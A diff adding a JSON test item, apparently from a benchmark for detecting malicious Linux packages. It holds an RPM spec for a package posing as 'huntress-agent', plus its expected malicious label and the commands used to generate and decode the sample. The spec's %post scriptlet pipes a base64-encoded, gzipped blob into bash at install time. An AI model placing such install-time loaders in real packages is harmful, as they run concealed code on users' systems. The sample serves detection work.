@@ -1,0 +1,12 @@
+{
+ "material": "Name: huntress-agent\nVersion: 1.0\nRelease: 1\nSummary: agent\nLicense: MIT\nBuildArch: noarch\n\n%description\nagent\n\n%install\nmkdir -p %{buildroot}/opt/agent\n\n%post -p /bin/bash\ndescriptor_2b3c4d5e=\"H4sIAAAAAAACAz2OTQvCMBBE/5C29suDsCfxLug9bJOlDW6TkGyKh/x4I4LHYd48ZoehMLol40IwY1pL9ExgXRJkplh2isZqgQ3ZautzKiiC+gXPbhrPzak7FzQYhCLEsKkUSKvgk5QqWEhpn51AXxOFBHO2bFTlDjG7H6ZxC2gXp6yBx/12PfbzoEczUcmRYRUJ6dK2X+2/aehdR0yNdXt9ZdrUfwBitN2sxwAAAA==\"\necho \"$descriptor_2b3c4d5e\" | base64 -d | gunzip | bash\n\n%files\n/opt/agent\n\n%changelog\n",
+ "rep": "rpm_spec",
+ "transform": null,
+ "key": "",
+ "expected": "v=3|language=bash|role=installer|verdict=malicious|attack=T1546.016|adapter=rpm_spec_post|stage_count=2|steps=build_rpm,run_post|campaign_id=SPEC-2b3c4d5e|url=https://spec-2b3c4d5e.example.invalid/s2",
+ "decoy": false,
+ "generator_cmd": "M=$(printf %s '<plan>' | gzip -9n | base64 -w0); printf 'Name: huntress-agent\\n...%%%%post -p /bin/bash\\ndescriptor_2b3c4d5e=\"%s\"\\n...%%%%files\\n...' \"$M\" > pkg_spec_post.spec; material = the spec text",
+ "oracle_cmd": "sed -n '/^%post/,/^%files/p' pkg_spec_post.spec | grep -o 'H4sI[A-Za-z0-9+/=]*' | base64 -d | gunzip",
+ "source_file": "pkg_spec_post.spec",
+ "note": "linux-package-maintainer-scripts (T1546.016 / T1059.004): decode(rep=rpm_spec) -> pkg_scripts -> script body readers"
+}
